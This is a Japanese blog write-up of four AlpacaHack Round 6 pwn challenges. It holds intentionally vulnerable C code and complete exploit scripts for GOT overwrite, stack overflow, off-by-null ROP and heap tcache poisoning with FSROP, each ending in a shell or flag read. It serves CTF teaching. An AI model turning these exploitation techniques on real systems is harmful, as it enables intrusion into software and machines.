---
来源: https://ptr-yudai.hatenablog.com/entry/2024/11/03/233033
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2024年11月（可能是Best Pwnable 2024）
---

、90日以上更新していないブログに表示しています。


# はじめに

AlpacaHackは[keymoon](https://x.com/kymn_)と[minaminao](https://x.com/vinami)が開発したCTFプラットフォームで、現在は[個人戦](https://d.hatena.ne.jp/keyword/%B8%C4%BF%CD%C0%EF)をメインにした定期CTFが開催されています。
また、過去大会の問題にも挑戦できるため、復習にも便利なサイトです。[\*1](#f-151339c0 "CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能")
今回の問題も解き直すことができますので、参加を逃した方も挑戦してみてください。

[alpacahack.com](https://alpacahack.com/ctfs/round-6)

↑ここまで定型文

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103205636.png)

第六回の上位勢

* [はじめに](#はじめに)
* [inbound (57 solves)](#inbound-57-solves)
  + [問題概要](#問題概要)
  + [脆弱性](#脆弱性)
  + [攻撃](#攻撃)
* [catcpy (41 solves)](#catcpy-41-solves)
  + [問題概要](#問題概要-1)
  + [脆弱性](#脆弱性-1)
  + [攻撃](#攻撃-1)
* [wall (21 solves)](#wall-21-solves)
  + [問題概要](#問題概要-2)
  + [脆弱性](#脆弱性-2)
  + [攻撃](#攻撃-2)
    - [ROP (Return Oriented Programming)](#ROP-Return-Oriented-Programming)
    - [Libcリーク](#Libcリーク)
    - [GOT overwrite](#GOT-overwrite)
    - [Exploitコード](#Exploitコード)
* [ideabook (10 solves)](#ideabook-10-solves)
  + [問題概要](#問題概要-3)
  + [脆弱性](#脆弱性-3)
  + [攻撃](#攻撃-3)

# inbound (57 solves)

## 問題概要

[グローバル変数](https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4)に定義されたint型配列`slot`に値を1つ入れられます。

```
int slot[10];
...
int main() {
  int index, value;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

プログラムにはフラグを出力する`win`関数が定義されており、これを呼び出すことが目的です。

```
/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

checksecでセキュリティ機構を確認すると、Partial RELRO, No canary[\*2](#f-01980f4a "ローカル変数で配列などを使っていない場合、gccの判断で自動的に無効化されます"), No PIEであることが確認できます。

```
$ checksec ./inbound
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

slotにアクセスするインデクスを入力したあと、それが10以上である場合は範囲外参照としてプログラムを終了します。

```
  int index, value;
...
  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }
```

しかし、`index`はint型で定義されているため、負数であるかも検査すべきです。
`slot`よりも負の方向に何があるか、[gdb](https://d.hatena.ne.jp/keyword/gdb)で確認してみましょう。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103211841.png)

[グローバル変数](https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4)slot周辺のメモリ

いくつかありますが、GOT (Global Offset Table)が書き換え可能領域[\*3](#f-0cfad9de "Full RELROでなければ書き換え可能です")にあるのがわかります。
ここにはlibcなどの外部ライブラリの関数を呼び出すときに使われる関数ポインタが格納されています。
つまり、ある関数のGOTを`win`関数のアドレスで上書きすると、その関数が呼ばれたときに`win`関数が呼び出されます。

このようにGOTを書き換えて任意の関数やROP gadgetなどを呼び出す攻撃をGOT overwriteと呼びます。

## 攻撃

GOT overwriteという方針が立ったら、次にどの関数のGOTを上書きするかを決めます。
まず、関数が呼び出される必要があるので、GOTを書き換えたあとに呼び出せる関数である必要があります。
[ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9)を確認すると、`printf`と`exit`が該当します。

```
...
  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

では`printf`のGOTを`win`関数に書き換えることはできるでしょうか？

残念ながら今回の問題では使えません。なぜなら、`slot`はint型の配列だからです。
`printf`はプログラム中ですでに何度か呼ばれているため、libc中の`printf`関数のアドレスに解決されています。
libcのアドレスは6バイトあるため、int型（4バイト）の書き換え1度では不十分です。

一方で`exit`はまだ呼び出されていないため、アドレスが解決されていません。
今回のプログラムはNo PIE（プログラム自身のアドレスは固定）であり、No PIEの場合アドレスは通常3バイトに収まる範囲に置かれます[\*4](#f-70e0f24c "GCCの場合であり、コンパイル時の設定で変えることもできます")。
したがって、`exit`のGOTであればint値の書き込みでも`win`関数のアドレスに制御することができます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

elf = ELF("../distfiles/inbound")
sock = Socket(HOST, PORT)

sock.sendlineafter("index: ", -14)
sock.sendlineafter("value: ", elf.symbol("win"))

sock.sh()
```

# catcpy (41 solves)

## 問題概要

グローバルバッファにデータを入れたあと、`main`関数のローカルバッファに`strcpy`か`strcat`を使ってコピーできます。

```
char g_buf[0x100];
...
int main() {
  int choice;
  char buf[0x100];

  memset(buf, 0, sizeof(buf));
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  puts("1. strcpy\n" "2. strcat");
  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1) return 1;

    switch (choice) {
      case 1:
        get_data();
        strcpy(buf, g_buf);
        break;

      case 2:
        get_data();
        strcat(buf, g_buf);
        break;

      default:
        return 0;
    }
  }
}
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

両方ともバッファのサイズは0x100なので`strcpy`は問題ありません。
しかし、`strcat`はバッファサイズに関係なくデータを付加してしまうため、スタック[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)が発生します。

今回の問題はstack canaryがないので、`main`関数のリターンアドレスを`win`関数のアドレスに書き換えることを目標にしましょう。

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## 攻撃

リターンアドレスを書き換える上で2つ問題があります。

1. NULL終端なので6バイトのリターンアドレスを1度に3バイトの`win`関数のアドレスにできない
2. `fgets`で入力を受け取るため、終端に改行コードが入ってしまう

1つめの問題は、何度か`strcat`を呼び出すことで解決できます。はじめに適当な長さの文字列でリターンアドレスの後半をNULLバイトを潰し、長さを1ずつ減らしていくことでNULLバイトを後ろから連続して書き込めます。

2つめの問題は、`fgets`に最大量の入力を入れることで解決できます。`fgets`は通常改行コードで終端しますが、「受け付ける入力サイズ-1」の長さを入力として与えると、最後をNULL終端として改行コードが入ることなく入力できます。

したがって、まず適度な長さの入力でリターンアドレスの高位ビットをNULL埋めし、次にfgetsに最大量の入力を与えることで`win`関数のアドレスを正しく与えられます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9999))

elf = ELF("../distfiles/catcpy")
sock = Socket(HOST, PORT)

# Fill with NULL
for i in range(2):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("Data: ", "A"*0x7f)
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("Data: ", "A"*(0x98 + (4 - i)))

# Overwrite return address
sock.sendlineafter("> ", "1")
sock.sendlineafter("Data: ", "A"*0x1b)
sock.sendlineafter("> ", "2")
# Send maximum amount so that fgets will not terminate with a newline
sock.sendafter("Data: ", b"A"*(0x100-4) + p32(elf.symbol("win"))[:3])

sock.sendlineafter("> ", "3")

sock.sh()
```

# wall (21 solves)

## 問題概要

メッセージと名前を入力できるだけのプログラムです。

```
#include <stdio.h>
#include <stdlib.h>

char message[4096];

void get_name(void) {
  char name[128];
  printf("What is your name? ");
  scanf("%128[^\n]%*c", name);
  printf("Message from %s: \"%s\"\n", name, message);
}

int main(int argc, char **argv) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  printf("Message: ");
  scanf("%4096[^\n]%*c", message);
  get_name();
  return 0;
}
```

セキュリティ機構はこれまでの問題と同様にNo PIE, No canary, Partial RELROです。

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

`get_name`関数を見ると、128バイトのバッファに対して`scanf`で128バイトのデータを入力しています。
しかし、`scanf`で文字列を入力するときは与えられたサイズに関係なくNULL終端を強要するため、NULLバイトが1バイトだけバッファの外に書き込めてしまいます。
このような[脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)をoff-by-nullと呼びます。

## 攻撃

### ROP (Return Oriented Programming)

今回のプログラムを[gdb](https://d.hatena.ne.jp/keyword/gdb)などで解析すると、書き換えられるのは`get_name`のスタックフレームに保存されたrbp[レジスタ](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF)であることがわかります。
`get_name`と`main`の[機械語](https://d.hatena.ne.jp/keyword/%B5%A1%B3%A3%B8%EC)を読むと、いずれも`leave; ret;`命令でリターンしています。

`leave`命令は以下の命令列と等価です。

```
mov rsp, rbp
pop rbp
```

したがって、off-by-nullを起こすと15/16の確率（もともとsaved rbpの最下位バイトが0でなかった場合）で`main`関数に戻ったときの[RSP](https://d.hatena.ne.jp/keyword/RSP)が壊れます。

特に、saved rbpの最下位バイトが大きかった場合、[RSP](https://d.hatena.ne.jp/keyword/RSP)が本来の場所より大きく低いアドレスにずれることになります。
低いアドレスは`get_name`のスタックフレームがあった場所であり、そこには`name`バッファがあります。
したがって、`main`関数からリターンする再に`get_name`の`name`バッファ中のデータをリターンアドレスとして解釈してしまう可能性があり、ROPが可能です。

`name`バッファの不要な箇所にはret命令のgadgetを敷き詰めておくことで、その周辺のどこからROPが始まってもret命令の部分はスキップされるため、ROPの成功確率が上がります。

### Libcリーク

近年は`pop rdi; ret;` gadgetがなくなってしまったため、`pop rbp; ret;` gadgetでlibcのアドレスをリークをしましょう。
ローカル変数を出力する箇所ではrbpが使われるので、`get_name`の出力箇所を対象にしました。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103223013.png)

`rbp-0x80`のアドレスを引数に渡しているので、リークしたいアドレス+0x80をrbpに設定してここを呼び出せば良いです。

### GOT overwrite

Libcのアドレスをリークしたら再度`main`に戻ってROPをしたいところですが、現在のスタックポインタが[BSS](https://d.hatena.ne.jp/keyword/BSS)を指しているため難しいです。
`printf`がかなりの量のスタックを使うため、どうしても読み込み専用領域にスタックポインタが移動してしまいます。

そこで、Partial RELROである特性を使ってGOT overwriteすることを考えます。
Libcリークと同様に、`scanf`の少し前から呼び出すことで自由なアドレスに`scanf`でデータを書き込むこともできます。
想定解のexploitでは`setbuf`関数のGOTを`system`関数に置き換え、`stderr`の場所に呼び出したいコマンドを書き込んでいます。
これにより、スタックを対象に消費することなく`system`関数を呼び出せます。

### Exploitコード

以下が想定解のexploit例になります。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9999))

libc = ELF("../distfiles/libc.so.6")
elf = ELF("../distfiles/wall")

while True:
    sock = Socket(HOST, PORT)

    rop  = p64(next(elf.gadget("pop rbp; ret;")))
    rop += p64(elf.got("setbuf") + 0x80)
    rop += p64(0x401196)
    payload  = p64(next(elf.gadget("ret"))) * ((4096 - len(rop)) // 8)
    payload += rop
    assert b"\n" not in payload
    sock.sendlineafter(": ", payload)

    rop  = p64(next(elf.gadget("pop rbp; ret;")))
    rop += p64(elf.got("printf") + 0x80)
    rop += p64(0x4011b1)
    payload  = p64(next(elf.gadget("ret"))) * ((0x80 - len(rop)) // 8)
    payload += rop
    assert b"\n" not in payload
    sock.sendlineafter("? ", payload)
    sock.recvline()

    try:
        r = sock.recvregex("from (.+): \"", timeout=0.5)
    except (TimeoutError, ConnectionResetError):
        logger.warning("Bad luck!")
        continue
    libc.base = u64(r[0]) - libc.symbol("printf")

    payload  = p64(libc.symbol("system")) # setbuf@got -> system
    payload += p64(elf.symbol("main")) # printf@got -> main
    payload += p64(0) * 6
    payload += p64(libc.symbol("_IO_2_1_stdout_")) + p64(0)
    payload += p64(libc.symbol("_IO_2_1_stdin_")) + p64(0)
    payload += p64(next(libc.find("/bin/sh")))
    assert b"\n" not in payload
    sock.sendline(payload)

    sock.sendline("cat /flag*")

    sock.sh()
    break
```

スタックの消費を回避するという複雑なexploitだったため作問当時はhard想定でしたが、より簡単にlibc leakできる方法があるためレビュー段階でmediumに下がったようです。
すでにwriteupをAlpacaHackに投稿してくれている方もいるようなので、簡単な方法については解いてくれた方のwriteupを是非読んでみてください。

[Writeups - AlpacaHack Round 6 (Pwn)](https://alpacahack.com/ctfs/round-6/writeups)

# ideabook (10 solves)

## 問題概要

最後はよくあるnote形式のヒープ問です。
noteのサイズとポインタは[グローバル変数](https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4)で管理されています。

```
unsigned short size_list[MAX_NOTE];
unsigned char *note_list[MAX_NOTE];
```

これに対してcreate, edit, read, deleteの4つの機能があります。

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

noteのインデクスを取得するとき、以下のようにインデクスを検査しています。

```
size_t get_index() {
  size_t idx;
  idx = get_val("Index: ");
  if (idx > sizeof(size_list)) {
    puts("[-] Invalid index");
    exit(1);
  }
  return idx;
}
```

配列に対する`sizeof`は配列の長さを返すのではなく、データサイズを返すため、範囲外参照が発生します。
（本来は`>=`であるべきところが`>`になっているのも問題です。）

メモリを確認すると、`size_list`は次のようになっています。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103230333.png)

各要素の型は`unsigned short`の2バイトで、このメモリレイアウトでは`note_list[0]`の下位2バイトを書き換えられてしまいます。
また反対に、`note_list[0]`をセットすることでインデクス=16のサイズが壊れます。

## 攻撃

まずインデクス=16にサイズ0のnoteを作ります。その後インデクス=0に適当なデータを作ることで、インデクス=16のサイズが壊れ、ヒープ[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)が発生します。

想定解のエクスプロイトではこのヒープ[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)を起点にlibc leakやtcache poisoningをしました。
（当然、ポインタを壊す方向でもexploitは可能ですが、オーバーフローの方が簡単なのでこちらを選びました。）

Tcacheのリンクリストを破壊したら、`stderr`に向けることで`stderr`を破壊し、[FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/)によりシェルを取っています。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

def create(index, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", index)
    sock.sendlineafter(": ", size)
def edit(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", index)
    sock.sendlineafter(": ", data)
def read(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", index)
    sock.recvuntil("Content: ")
    return sock.recvuntil("> ", drop=True, lookahead=True)
def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", index)

#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("./chall")
libc = ELF("../distfiles/libc.so.6")
sock = Socket(HOST, PORT)

# Leak heap
create(16, 0x00)
create(0, 0x18)
create(1, 0x18)
delete(1)
create(2, 0x100)
create(3, 0x100)
create(4, 0x100)
create(5, 0x100)
edit(5, p64(0x21) * (0x100//8 - 1)) # fake chunk size

leak = read(16)
heap_base = u64(leak[0x40:0x48]) << 12
logger.info("heap = " + hex(heap_base))

# Leak libc
create(1, 0x18)
edit(16, b"A"*0x18 + p64(0x21) + b"B"*0x18 + p64(0x421)) # overwrite chunk size
delete(1) # link to unsortedbin
leak = read(16)
libc.base = u64(leak[0x40:0x48]) - libc.main_arena() - 0x60

# Corrupt tcache link
create(6, 0xe0)
create(7, 0xe0)
delete(7)
delete(6)
target = libc.symbol("_IO_2_1_stderr_")
edit(16, b"A"*0x18 + p64(0x21) + b"B"*0x18 + p64(0xf1) + p64(target ^ (heap_base >> 12)))

# Overwrite stderr
create(6, 0xe0)
create(7, 0xe0)
payload  = p32(0xfbad0101) + b";sh\0" # fp->_flags & _IO_UNBUFFERED == 0)
payload += b"\x00" * (0x58 - len(payload))
payload += p64(libc.symbol("system")) # vtable->iowalloc
payload += b"\x00" * (0x88 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xa0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xc0 - len(payload))
payload += p32(1) # fp->_mode != 0
payload += b"\x00" * (0xd0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # (1) _wide_data->vtable
payload += p64(libc.symbol("_IO_wfile_jumps") + 0x18 - 0x58) # _IO_wfile_jumps + delta
edit(7, payload[:-1])

sock.sendlineafter("> ", "5")
sock.sendline("cat /flag*")

sock.sh()
```

[\*1](#fn-151339c0):CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能

[\*2](#fn-01980f4a):ローカル変数で配列などを使っていない場合、[gcc](https://d.hatena.ne.jp/keyword/gcc)の判断で自動的に無効化されます

[\*3](#fn-0cfad9de):Full RELROでなければ書き換え可能です

[\*4](#fn-70e0f24c):[GCC](https://d.hatena.ne.jp/keyword/GCC)の場合であり、[コンパイル](https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB)時の設定で変えることもできます


[« 
KalmarCTF 2025 Writeup](https://ptr-yudai.hatenablog.com/entry/2025/03/10/123050)

[AlpacaHack Round 1 (Pwn)のWriteup
 »](https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647)